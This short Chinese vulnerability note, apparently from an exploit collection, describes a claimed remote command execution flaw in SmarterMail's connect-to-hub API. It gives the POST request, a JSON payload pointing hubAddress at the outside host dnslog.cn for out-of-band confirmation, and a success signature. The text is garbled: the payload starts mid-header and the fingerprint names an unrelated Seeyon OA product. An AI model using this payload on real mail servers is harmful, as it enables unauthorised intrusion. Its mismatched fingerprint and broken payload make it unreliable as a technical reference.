# SmarterTools-SmarterMailconnect-to-hub存在远程命令执行漏洞

SmarterTools ｜ 命令执行 ｜ —
- **指纹**：`app="致远互联-OA"`
- **请求**：`POST /api/v1/settings/sysadmin/connect-to-hub HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
"hubAddress": "http://dnslog.cn",
"oneTimePassword": "test",
"nodeName": "victim"
}
```
- **响应特征**：200 dnslog